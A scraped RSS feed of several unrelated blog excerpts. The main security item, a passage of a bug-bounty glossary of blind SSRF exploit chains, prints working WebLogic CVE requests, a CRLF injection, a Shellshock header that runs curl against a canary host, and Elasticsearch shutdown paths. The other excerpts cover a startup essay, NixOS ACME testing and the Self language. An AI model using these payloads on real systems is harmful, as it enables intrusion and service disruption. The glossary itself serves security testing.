src="https://blog.interviewquery.com/content/images/2021/01/image-18.png" alt="Interview Query SQL" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-18.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-18.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image-18.png 1364w" sizes="(min-width: 720px) 720px"><figcaption>An example of a SQL interview question we would send out. If you paid for premium, we would send a detailed explanation + solution the next day.&nbsp;</figcaption></figure><p>The first time someone purchased a subscription in June of 2019, my co-founder Shane was convinced it was a stolen credit card. It took five more customers before he truly believed that we were not just a test platform for fraudsters. And we watched in fascination as our newsletter grew from $60/mo in revenue to $3,000/mo in revenue. <br></p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-19.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-19.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-19.png 1000w, https://blog.interviewquery.com/content/images/2021/01/image-19.png 1258w" sizes="(min-width: 720px) 720px"></figure><p>And while $3K/mo was a lot of money, it still wasn’t enough to constitute quitting our jobs. Shane was working part-time on it while also working a software engineering job. And I was also a pretty senior data scientist making <a href="https://www.interviewquery.com/blog-data-science-salaries">$160K/year</a>. So an apples to apples comparison of going from to $14K/month to $1.5K/month didn’t really seem worth it. </p><p>But direct income &nbsp;isn’t the only comparison you have to make. </p><h2 id="opportunity-cost">Opportunity Cost</h2><p>The hardest jump to make is almost always on money. Money has always had significance to me. I was born and raised as a Chinese American which meant money was and still is an intrinsic part of my identity. The comedian <a href="https://www.youtube.com/watch?v=O_KpLrHCAx0">Ronnie Chieng does a funny bit</a> on what money means to Chinese people.</p><blockquote>“Do you know what the direct translation of <em>Happy New Year</em> in Mandarin is? Hope - you - get - rich. <strong>That's not Happy New Year!</strong>"</blockquote><p>To my Chinese parents, they could have added an addendum of - <em>Hope you get rich while working a stable job with low risk.</em> For with all monetary pursuits, the equation that works best within typical Chinese American families is:</p><p><em>Current income * very stable job * years of working = <strong>Best Possible Outcome Ever</strong></em></p><p>It’s a pretty linear expectation of wealth that requires a normal day to day grind and the advantages of compound interest. But the equation never really took into account tweaking the risk factor. What happens when your current income drops and risk tolerance increases? </p><p>This was the pivotal question that made it difficult for me to quit. But a month before I ended up leaving, I met up with my old startup boss at a <a href="https://techcrunch.com/2016/06/08/monster-snaps-up-tinder-for-jobs-app-jobr/">company where we exited into an acquisition</a>. I told him about the dilemma I was in, and he illustrated a newer way of looking at it. </p><blockquote>If you have a product that’s making $3K/month and you can grow that into $5K/month in a few months by working full time on it, you have to realize that the <strong>actual added value of growing your business</strong> is turning it from $36K/year in revenue to $60K/year in revenue.<br></blockquote><p>This realization helped me understand the <strong>value investment of full-time work. </strong>Money and finances can be traded for time and investment in a business in ways that you can't when you work a job. Work your ass off for a year at any FAANG type of tech company and your boss will reward you with a 15% raise. Work hard on your business and double your monthly revenue after a year, <strong>well your business also just doubled in value. </strong></p><p>So the opportunity cost of trading a job that made me $160K/year didn’t seem that bad anymore if I could at least <strong>forecast a rate of growth that would be worth my time and investment</strong> as if I was working another full time job. </p><p>And at least on my own business, I’d enjoy the work. </p><h2 id="flexibility-and-values">Flexibility and Values</h2><p>Everything gets destroyed when you bulldoze a building. The walls, the appliances, even parts of the foundation. And while throwing a wrecking ball into the corporate 9-5 felt gratifying, picking up the pieces to rebuild <strong>exactly how I would work</strong> took just as much careful planning and thought. </p><p>Balancing structure and life is important when bootstrapping. A lifestyle business allows you flexibility in how you would like to run your business. Before I quit my job, I talked to a career coach (ironically employed by the company) who encouraged me to figure out my values - and try to see if quitting allowed me to prioritize them accordingly.</p><p>Eventually I realized it did when I wanted to re-prioritize my activity list from:</p><ol><li><em>Data science job</em></li><li><em>Surfing</em></li><li><em>Side-Hustle (Interview Query)</em></li><li><em>Friends and Relationships</em></li><li><em>Random data projects</em></li></ol><p>to</p><ol><li><em>Surfing</em></li><li><em>Interview Query</em></li><li><em>Friends and Relationships</em></li><li><em>Random data projects</em></li><li><em>Things I don’t want to do but have to do to make money</em></li></ol><p>This clear order of change in my lifestyle made me realize that valuing flexibility was extremely important. It was also something I couldn't attain in my day job.</p><p>For example, when an amazing swell approaches Ocean Beach now, I reschedule meetings, log off, and go surfing. Shane and I both have trust that I'm going to finish the work that needs to get done. But if I were to receive a meeting at my old job that conflicted or I didn't want to attend - there was no way around it. </p><p>As controllers of our own fate, we make it a priority to cut down all the things we don’t want to do, and hire for those roles. If we need vacation time, then we take it.</p><p>But on that note of flexibility comes the other way - how flexible can we be while still working? And how much did we really want to work in general?</p><h2 id="financial-independence-of-sorts">Financial Independence of Sorts</h2><p>In February of 2020, Interview Query was churning out a consistent $9K/month in revenue. We tripled revenue by increasing our distribution and had transitioned from the email newsletter to building a very simple interface for viewing all of the interview questions and solutions. It was also enough to now cover my rent and general expenses.</p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-22.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-22.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2021/01/image-22.png 1000w, https://blog.interviewquery.com/content/images/size/w1600/2021/01/image-22.png 1600w, https://blog.interviewquery.com/content/images/size/w2400/2021/01/image-22.png 2400w" sizes="(min-width: 720px) 720px"><figcaption><a href="https://www.interviewquery.com/questions/bank-fraud-model">Our current interface - much improved from before</a></figcaption></figure><p>And better yet we still weren’t even working that much. I had taken a long vacation in New Zealand and Shane was still working part time. For a moment, it seemed like it was going to be a 4-hour work week kind of business that we could maintain without adding new product features. </p><p>But realistically, <strong>I had nothing else to work on</strong>. I still hadn’t gotten any of my other side-projects off the ground at the time. Surfing season was slowly ramping down. I looked around at what I was doing and realized that this project was the only one working and growing on its own. So why not invest to work on it?</p><p>One of my favorite ice breakers is asking people what they would do with their life if they received $10,000/month forever. Kind of like a basic<strong> </strong>(wealthy) income. Many people say travel (<em>which seems illogical given the extent of traveling for the rest of your life</em>), others say they’d make music, volunteer full time, work on making furniture, even working at a boba shop.</p><figure><img src="https://blog.interviewquery.com/content/images/2021/01/image-20.png" alt="" srcset="https://blog.interviewquery.com/content/images/size/w600/2021/01/image-20.png 600w, https://blog.interviewquery.com/content/images/2021/01/image-20.png 800w" sizes="(min-width: 720px) 720px"><figcaption>Our New Zealand van!</figcaption></figure><p>It’s a thought experiment on the idea of financial independence (FIRE). And at its core, the question is asking about what you would practically do for the rest of your life if money wasn’t an issue. The current existence of career advancement is fueled by a never-ending competition in monetary and title status. But if those were all stripped away, what would be left to complete life satisfaction?</p><p>I realized there was nothing else I wanted to do but build a startup anyway. Of course money will always matter and I inherently want to grow the business bigger and bigger. But what happens when it’s just a question of: <em>what do I do with my time when my expenses are accounted for and I want to be productive?</em></p><p>Many people in the FIRE community seem to be at loss when they finally achieve their financial freedom. They grind at a job for 15 years to finally quit and reach the same elation that I felt for maybe a few weeks or even months to suddenly fall back into a depression of sorts. Their life has no purpose after hitting their number. Which makes sense, because for 15 years <strong>all they knew about was the grind</strong> and <strong>all they thought about was hitting their number</strong>.</p><p>I personally love startups and businesses. Building and running companies requires the experience and skillset to get better at doing so. And so the question posed that helped me understand things was: </p><p><em>Would you rather be completely financially independent at age X and then quit your job to try a startup, or get good at building startups now and be a complete pro at age X instead?</em></p><h2 id="buy-futures-in-yourself">Buy Futures in Yourself</h2><p>The first few weeks after quitting my job I enjoyed the classic freedom and flexibility I had …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.interviewquery.com/blog-reflecting-on-bootstrapping-our-data-science-business/">https://www.interviewquery.com/blog-reflecting-on-bootstrapping-our-data-science-business/</a></em></p>]]>
            </description>
            <link>https://www.interviewquery.com/blog-reflecting-on-bootstrapping-our-data-science-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25785534</guid>
            <pubDate>Fri, 15 Jan 2021 01:02:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Glossary of Blind SSRF Chains]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25784627">thread link</a>) | @wglb
<br/>
January 14, 2021 | https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/blind-ssrf-chains.png" alt="" width="80%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>&nbsp;</td>
    </tr>
  </tbody>
</table>


<h2 id="what-is-server-side-request-forgery-ssrf">What is Server Side Request Forgery (SSRF)?</h2>

<p>Server Side Request Forgery occurs when you can coerce a server to make arbitrary requests on your behalf. As the requests are being made by the server, it may be possible to access internal resources due to where the server is positioned in the network. On cloud environments, SSRF poses a more significant risk due to the presence of <a href="https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b">metadata endpoints</a> that may contain sensitive credentials or secrets.</p>

<h2 id="blind-ssrf">Blind SSRF</h2>

<p>When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. In the industry, this behaviour is often referred to as “Blind SSRF”. In such situations, how do we prove impact? This was an interesting discussion that was sparked by Justin Gardner on Twitter:</p>

<blockquote data-theme="dark"><p lang="en" dir="ltr">I've been finding a large amount of Blind SSRFs recently. What kind of one-shot RCE's have you guys used as pivots for these in the past? I've got access to some Kafka and a bunch of other things. <a href="https://twitter.com/nnwakelam?ref_src=twsrc%5Etfw">@nnwakelam</a> <a href="https://twitter.com/thedawgyg?ref_src=twsrc%5Etfw">@thedawgyg</a></p>— Justin Gardner (@Rhynorater) <a href="https://twitter.com/Rhynorater/status/1349290375312154625?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>


<p>If you can reach internal resources, there are a number of potential exploit chains that can be executed to prove impact. This blog post attempts to go into detail for each known exploit chain when leveraging blind SSRF, and will be updated as more techniques are discovered and shared.</p>

<p>You can find a GitHub repo with all of these techniques here: <a href="https://github.com/assetnote/blind-ssrf-chains">Blind SSRF Chains</a>.</p>

<p>Please send us a pull request on GitHub if you would like any more techniques to be added to this glossary.</p>

<h2 id="ssrf-canaries">SSRF Canaries</h2>

<blockquote data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">I tend to call them SSRF canaries, when chaining a blind SSRF to another SSRF internally which makes an additional call externally, or by an app-specific open redir or blind XXE. Confluence, Artifactory, Jenkins and JAMF have some that works well.</p>— Frans Rosén (@fransrosen) <a href="https://twitter.com/fransrosen/status/1349397387920502786?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>


<p>In order to validate that you can interact with internal services or applications, you can utilise “SSRF canaries”.</p>

<p>This is when we can request an internal URL that performs another SSRF and calls out to your canary host. If you receive a request to your canary host, it means that you have successfully hit an internal service that is also capable making outbound requests.</p>

<p>This is an effective way to verify that an SSRF vulnerability has access to a internal networks or applications, and to also verify the presence of certain software existing on the internal network. You can also potentially pivot to more sensitive parts of an internal network using an SSRF canary, depending on where it sits.</p>

<h2 id="using-dns-datasources-and-altdns-to-find-internal-hosts">Using DNS datasources and AltDNS to find internal hosts</h2>

<p>With the goal being to find as many internal hosts as possible, DNS datasources can be utilised to find all records that point to internal hosts.</p>

<p>On cloud environments, we often see ELBs that are pointing to hosts inside an internal VPC. Depending on which VPC the asset you’re targeting is in, it may be possible to access other hosts within the same VPC.</p>

<p>For example, consider the following host has been discovered from DNS datasources:</p>

<pre><code>livestats.target.com -&gt; internal-es-livestats-298228113.us-west-2.elb.amazonaws.com -&gt; 10.0.0.82
</code></pre>

<p>You can make an assumption that the <code>es</code> stands for Elasticsearch, and then perform further attacks on this host. You can also spray all of these blind SSRF payloads across all of the “internal” hosts that have been identified through this method. This is often effective.</p>

<p>To find more internal hosts, I recommend taking all of your DNS data and then using something like <a href="https://github.com/infosec-au/altdns">AltDNS</a> to generate permutations and then resolve them with a <a href="https://github.com/blechschmidt/massdns">fast DNS bruteforcer</a>.</p>

<p>Once this is complete, identify all of the newly discovered internal hosts and use them as a part of your blind SSRF chain.</p>

<h2 id="side-channel-leaks">Side Channel Leaks</h2>

<p>When exploiting blind SSRF vulnerabilities, you may be able to leak some information about the response being returned. For example, let’s say that you have blind SSRF via an XXE, the error messages may indicate whether or not:</p>

<ul>
  <li>A response was returned</li>
</ul>

<p><code>Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.</code></p>

<p>vs.</p>

<ul>
  <li>Host and port are unreachable</li>
</ul>

<p><code>Error parsing request: System.Net.WebException: Unable to connect to the remote server</code></p>

<p>Similarly, outside of XXEs, a web application could also have a side channel leak that can be ascertained by inspecting differences within the:</p>

<ul>
  <li><strong>Response status code</strong>:</li>
</ul>

<p>Online internal asset:port responds with <code>200 OK</code> vs offline internal asset:port <code>500 Internal Server Error</code></p>

<ul>
  <li><strong>Response contents</strong>:</li>
</ul>

<p>The response size in bytes is smaller or bigger depending on whether or not the URL you are trying to request is reachable.</p>

<ul>
  <li><strong>Response timing</strong>:</li>
</ul>

<p>The response times are slower or faster depending on whether or not the URL you are trying to request is reachable.</p>

<hr>


<p><strong>Possible via HTTP(s)</strong></p>

<ul>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#elasticsearch">Elasticsearch</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#weblogic">Weblogic</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#consul">Hashicorp Consul</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#shellshock">Shellshock</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#druid">Apache Druid</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#solr">Apache Solr</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#peoplesoft">PeopleSoft</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#struts">Apache Struts</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jboss">JBoss</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#confluence">Confluence</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jira">Jira</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#atlassian-products">Other Atlassian Products</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#opentsdb">OpenTSDB</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#jenkins">Jenkins</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#hystrix">Hystrix Dashboard</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#w3">W3 Total Cache</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#docker">Docker</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#redisexporter">Gitlab Prometheus Redis Exporter</a></li>
</ul>

<p><strong>Possible via Gopher</strong></p>

<ul>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#redis">Redis</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#memcache">Memcache</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#tomcat">Apache Tomcat</a></li>
</ul>

<p><strong>Tools</strong></p>

<ul>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#gopherus">Gopherus</a></li>
  <li><a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/#ssrfproxy">SSRF Proxy</a></li>
</ul>

<hr>

<p><strong>Possible via HTTP(s)</strong></p>



<h2 id="elasticsearch">Elasticsearch</h2>

<p><strong>Commonly bound port: 9200</strong></p>

<p>When Elasticsearch is deployed internally, it usually does not require authentication.</p>

<p>If you have a partially blind SSRF where you can determine the status code, check to see if the following endpoints return a 200:</p>

<pre><code>/_cluster/health
/_cat/indices
/_cat/health
</code></pre>

<p>If you have a blind SSRF where you can send POST requests, you can shut down the Elasticsearch instance by sending a POST request to the following path:</p>

<p>Note: the <code>_shutdown</code> API has been removed from Elasticsearch version 2.x. and up. This only works in Elasticsearch 1.6 and below:</p>

<pre><code>/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
</code></pre>



<h2 id="weblogic">Weblogic</h2>

<p><strong>Commonly bound ports: 80, 443 (SSL), 7001, 8888</strong></p>

<p><strong>SSRF Canary: UDDI Explorer (CVE-2014-4210)</strong></p>

<pre><code>POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
</code></pre>

<p>This also works via GET:</p>

<pre><code>http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
</code></pre>

<p>This endpoint is also vulnerable to CRLF injection:</p>

<pre><code>GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
</code></pre>

<p>Will result in the following request:</p>

<pre><code><a href="https://blog.assetnote.io/cdn-cgi/l/email-protection" data-cfemail="12607d7d66527f737b7e">[email&nbsp;protected]</a>:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;env:Header/&gt;&lt;env:Body&gt;&lt;find_business generic="2.0" xmlns="urn:uddi-org:api_v2"&gt;&lt;name&gt;sdf&lt;/name&gt;&lt;/find_business&gt;&lt;/env:Body&gt;&lt;/env:Envelope&gt;
</code></pre>

<p><strong>SSRF Canary: CVE-2020-14883</strong></p>

<p>Taken from <a href="https://forum.90sec.com/t/topic/1412">here</a>.</p>

<p>Linux:</p>

<pre><code>POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
</code></pre>

<p>Windows:</p>

<pre><code>POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
</code></pre>



<h2 id="hashicorp-consul">Hashicorp Consul</h2>

<p><strong>Commonly bound ports: 8500, 8501 (SSL)</strong></p>

<p>Writeup can be found <a href="https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html">here</a>.</p>



<h2 id="shellshock">Shellshock</h2>

<p><strong>Commonly bound ports: 80, 443 (SSL), 8080</strong></p>

<p>In order to effectively test for Shellshock, you may need to add a header containing the payload. The following CGI paths are worth trying:</p>

<p>Short list of CGI paths to test:</p>

<p><a href="https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4">Gist containing paths</a>.</p>

<p><strong>SSRF Canary: Shellshock via User Agent</strong></p>

<pre><code>User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
</code></pre>



<h2 id="apache-druid">Apache Druid</h2>

<p><strong>Commonly bound ports: 80, 8080, 8888, 8082</strong></p>

<p>See the API reference for Apache Druid <a href="https://druid.apache.org/docs/latest/operations/api-reference.html">here</a>.</p>

<p>If you can view the status code, check the following paths to see if they return a 200 status code:</p>

<pre><code>/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
</code></pre>

<p>Shutdown tasks, requires you to guess task IDs or …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/">https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25784627</guid>
            <pubDate>Thu, 14 Jan 2021 23:35:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pebble and Lego to test ACME with NixOS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25784351">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://terinstock.com/post/2021/01/Pebble-and-lego-to-test-ACME-with-NixOS/ | <a href="https://web.archive.org/web/*/https://terinstock.com/post/2021/01/Pebble-and-lego-to-test-ACME-with-NixOS/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<p>When configuring a new service I want to run on NixOS, I often use
<a href="https://github.com/Mic92/nixos-shell">nixos-shell</a> to quickly standup a temporary VM locally with my new
configuration. When this configuration is a service, I often want to ensure I
have TLS configured properly, including the correct permissions on the
certificate and key files managed by <a href="https://go-acme.github.io/lego/">lego</a>.</p>

<p>However, I don’t neccessarily want to send unacceptable amounts of traffic to
production ACME servers, or deal with proper validation with their staging
services. Fortunately, we can configure the NixOS VM to start a testing ACME
server, <a href="https://github.com/letsencrypt/pebble">Pebble</a>, and configure Lego to use it.</p>

<h2 id="pebble">Pebble</h2>

<p>Pebble is a small, single-binary ACME server intended for testing. Keys and
certificates are randomnized between calls, but this is fine for an emphermial
VM.</p>

<p>First, we’ll want to configure Pebble to start, which we can do with the
<code>systemd.service</code> NixOS option. I use the <code>toJSON</code> builtin function to create a
JSON configuration file for Pebble from a Nix attribute set. I also reference
the default certificate and key from the source package, as they are not yet
copied to the output package.</p>
<div><pre><span></span>{ pkgs }:

<span>let</span>
  <span>pebbleConfig =</span> pkgs.writeText <span>"pebble.json"</span> (<span>builtins</span>.toJSON {
    <span>pebble =</span> {
      <span>listenAddress =</span> <span>"0.0.0.0:14000"</span>;
      <span>managementListenAddress =</span> <span>"0.0.0.0:15000"</span>;
      <span>certificate =</span> <span>"${</span>pkgs.pebble.src<span>}/test/certs/localhost/cert.pem"</span>;
      <span>privateKey =</span> <span>"${</span>pkgs.pebble.src<span>}/test/certs/localhost/key.pem"</span>;
      <span>httpPort =</span> <span>5002</span>;
      <span>tlsPort =</span> <span>5001</span>;
      <span>ocspResponderURL =</span> <span>""</span>;
      <span>externalAccountBindingRequired =</span> <span>false</span>;
    };
  });
<span>in</span> {
  systemd.services.<span>pebble =</span> {
    <span>description =</span> <span>"Pebble ACME Test Server"</span>;
    <span>after =</span> [ <span>"network-online.target"</span> ];
    <span>wantedBy =</span> [ <span>"multi-user.target"</span> ];
    <span>serviceConfig =</span> {
      <span>Environment =</span> [ <span>"PEBBLE_VA_NOSLEEP=1"</span> <span>"PEBBLE_VA_ALWAYS_VALID=1"</span> ];
      <span>ExecStart =</span> <span>"${</span>pkgs.pebble<span>}/bin/pebble -config ${</span>pebbleConfig<span>}"</span>;
      <span>DynamicUser =</span> <span>true</span>;
    };
  };
}
</pre></div>

<p>You can modify some behavior of Pebble through environment variables. I set two
for better behavior in a development VM:</p>

<ul>
<li><code>PEBBLE_VA_NOSLEEP</code> disables any artifical sleeps in the issuance path, as
we’re not interested in testing lego’s validationg polling.</li>
<li><code>PEBBLE_VA_ALWAYS_VALID</code> disables all validation methods, and assumes domains
have already been successfully validated.</li>
</ul>

<p>One warning from the Pebble documentation bares repeating here:</p>

<blockquote>
<p>Pebble is <strong>NOT INTENDED FOR PRODUCTION USE</strong>. Pebble is for <strong>testing only</strong>.</p>
</blockquote>

<h2 id="lego">lego</h2>

<p>lego is a widely used ACME client that implements all of the ACME challenges,
bindings for major DNS providers, and support for bundling certificates. It’s
used as the implementation to NixOS’s <code>security.acme</code> options. This means most
of the configuration is already done for us.</p>
<div><pre><span></span>{
  security.<span>acme =</span> {
    <span>server =</span> <span>"https://localhost:14000/dir"</span>;
    <span>acceptTerms =</span> <span>true</span>;
    <span>email =</span> <span>"webmaster@example.com"</span>;
    <span>certs =</span> {
      <span>"example.com"</span> = {
        <span>webroot =</span> <span>"/var/www/example.com"</span>;
        <span>group =</span> <span>"prosody"</span>;
      };
    };
  };
}
</pre></div>

<p>Despite not needing to implement any challenges, as we’ve disabled them in
Pebble, we still need to provide <code>webroot</code> configuration. The <code>group</code> attribute
is used to set the group permission on the generated certificates and keys, and
should be set to the same user your server is running as.</p>

<p>There’s one farther complication: lego does not trust the certificate authority
used by the ACME server, and thus it won’t issue requests out of the box. We can
configure the lego to trust these certificates by setting the environment of the
generated service unit.</p>
<div><pre><span></span>{
  systemd.services.<span>"acme-example.com"</span>.serviceConfig.<span>Environment =</span> [
    <span>"LEGO_CA_CERTIFICATES=${</span>pkgs.pebble.src<span>}/test/certs/pebble.minica.pem"</span>
    <span>"LEGO_CA_SERVER_NAME=localhost"</span>
  ];
}
</pre></div>

<h2 id="usage">Usage</h2>

<p>The certificates and keys created by <code>security.acme</code> are stored underneath
<code>/var/lib/acme/</code>. This can be provided to your server’s configuration.</p>
<div><pre><span></span>{
  services.<span>prosody =</span> {
    <span>enable =</span> <span>true</span>;
    virtualHosts.<span>"example.com"</span> = {
      <span>enabled =</span> <span>true</span>;
      ssl.<span>cert =</span> <span>"/var/lib/acme/git.terinstock.com/fullchain.pem"</span>;
      ssl.<span>key =</span> <span>"/var/lib/acme/git.terinstock.com/key.pem"</span>;
    };
  };
}
</pre></div>

      </div></div>]]>
            </description>
            <link>https://terinstock.com/post/2021/01/Pebble-and-lego-to-test-ACME-with-NixOS/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25784351</guid>
            <pubDate>Thu, 14 Jan 2021 23:15:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Tour of Self]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25784081">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://sin-ack.github.io/posts/a-tour-of-self/ | <a href="https://web.archive.org/web/*/https://sin-ack.github.io/posts/a-tour-of-self/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Hey there. This is the first post I will be making here, and I wanted to give a
tour of Self before making posts about my current implementation, mySelf.</p>
<p>Throughout this post, I will be showing examples from the regular implementation
of the Self programming environment, available
<a href="https://github.com/russellallen/self">here</a>.</p>
<h2 id="what-is-self">What is Self?</h2>
<p>To quote the <a href="https://selflanguage.org/">Self language homepage</a>:</p>
<blockquote>
<p>Self is a prototype-based dynamic object-oriented programming language,
environment, and virtual machine centered around the principles of simplicity,
uniformity, concreteness, and liveness. Self includes a programming language, a
collection of objects defined in the Self language, and a programming
environment built in Self for writing Self programs. The language and
environment attempt to present objects to the programmer and user in as direct
and physical a way as possible. The system uses the prototype-based style of
object construction.</p>
</blockquote>
<p>Self was designed at Xerox PARC by David Ungar and Randall B. Smith in 1986, and
was implemented at Stanford University. Development then continued at Sun
Microsystems before eventually stopping in the early 2000s.</p>
<h2 id="an-introduction-to-self">An introduction to Self</h2>
<p>Self is an image-based programming language, similar to Smalltalk. It provides
a <em>programming environment</em> that you interact with as the system is running. The
runtime is based on the idea of “processes”: each piece of Self code you run has
its own process (not an OS process – a Self process) in which it runs until
